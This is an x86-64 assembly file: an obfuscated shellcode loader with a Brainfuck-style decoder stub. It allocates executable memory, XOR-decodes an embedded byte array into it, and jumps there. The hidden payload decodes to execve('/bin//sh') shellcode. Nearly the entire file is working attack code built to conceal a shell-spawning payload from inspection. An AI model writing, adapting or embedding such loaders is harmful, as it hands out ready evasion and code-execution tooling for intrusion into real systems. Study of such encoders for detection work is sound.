; brainfuck = shellcode?

BITS 64
global _start

section .text

_start:
    ; mmap RWX
    mov rax, 9
    xor rdi, rdi
    mov rsi, 0x1000
    mov rdx, 7
    mov r10, 0x22
    mov r8, -1
    xor r9, r9
    syscall

    mov rbx, rax          ; output buffer

    ; BF setup
    lea rdi, [rel bf_code]
    lea rsi, [rel encoded]
    xor rcx, rcx          ; index

bf_loop:
    mov al, [rdi]
    cmp al, 0xFF
    je done

    cmp al, '+'
    je do_inc
    cmp al, '.'
    je do_emit

next:
    inc rdi
    jmp bf_loop

do_inc:
    inc byte [rsi + rcx]
    jmp next

do_emit:
    mov al, [rsi + rcx]
    xor al, 0xAA
    mov [rbx + rcx], al
    inc rcx
    jmp next

done:
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    and rsp, -16
    call rbx

; ===== encoded payload =====
encoded:
    db 0xe2,0x9b,0x5c,0xfc
    db 0xe2,0x15,0x85,0xc8,0xc3,0xc4,0x85,0x85,0xd9,0xc2
    db 0xfd,0xfe,0xf5
    db 0x1a,0x91
    db 0xa5,0xaf

; ===== BF program =====
; tiap byte:
;   + → dummy (optional)
;   . → emit decoded byte
bf_code:
    db ".",".",".",".",".",".",".",".",".","."
    db ".",".",".",".",".",".",".",".",".","."
    db ".",".",".",".",".",".",".",".",".","."
    db 0xFF
